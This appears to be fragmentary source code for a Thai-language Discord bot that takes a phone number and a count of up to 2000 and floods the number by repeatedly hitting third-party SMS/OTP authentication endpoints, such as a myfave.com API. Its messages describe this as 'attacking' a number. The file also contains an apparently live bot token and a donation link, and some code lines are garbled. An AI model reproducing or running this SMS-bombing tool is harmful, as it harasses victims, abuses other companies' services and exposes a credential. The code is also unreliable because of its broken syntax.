...
PREFIX = ';'
TOKEN = 'OTQ4Nzg5ODMzNDk5ODAzNjcw.YiA7Yw.sxajUi-qhxfceiHr6jNvjxxIQCY'
CHANNEL = '948791744265342976'
AMOUNT = 2000
...
def ctx244(phone):
 sk1(phone):
    posthttps://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"66{phone}"})
...
@bot.command()
async def help(ctx):
    await ctx.send(f"`คำสั่งยิงเบอร์ซื่อ` : {PREFIX}sms (เบอร์) (จำนวน1- {str(AMOUNT)}ครั้ง)\n`สถานะบอท` : ปกติ/ออนไลน์\n`แจ้งเตือน` : ข้อความจะถูกลบภายใน40วิ\nhttps://share.creavite.co/ZDK6qSKt1TfNgqX1.gif",delete_after=40)
    await ctx.message.delete()

@bot.command()
async def chk(ctx):
    await ctx.send(f"สถานะ: SMSSELLER [<:5251onlinestatus:926558695322697798>]",delete_after=15)
    await ctx.message.delete()
...
async def sms(ctx, phone=None, amount=None):
    if (str(ctx.message.channel.id) == CHANNEL):
        if (phone == None or amount == None):
            await ctx.send("`สถานะบอท` : <:5163dndstatus:926558695633068092>โจมตีไม่สำเร็จ\n`แจ้งเตือน` : กรุณาใส่ข้อมูลให้ครบถ้วน",delete_after=15)
            await ctx.message.delete()
            ...
            try:
                ...
                if (amount > AMOUNT):
                    ...
                    await ctx.send(f" `เริ่มยิงเบอร์` : 0---------\n`จำนวนเวลา` : {amount} ครั้ง\n \n  https://share.creavite.co/ZDK6qSKt1TfNgqX1.gif",)
                    startall(phone, amount)
                    await ctx.message.delete()

            except:
                await ctx.send("`สถานะบอท` : <:5163dndstatus:926558695633068092>โจมตีไม่สำเร็จ\n`แจ้งเตือน` : ใส่จำนวนไม่ถูกต้อง",delete_after=0.1)
                await ctx.message.delete()
...
async def donate(ctx):
    await ctx.send(f"`donateที่` : https://zerohubgood.000webhostapp.com/x2sword-donate.php  ",delete_after=4000000000000)
    await ctx.message.delete()

        
bot.run(TOKEN, reconnect=True)
https://replit.com/join/vhmooqxpbx-ibohub
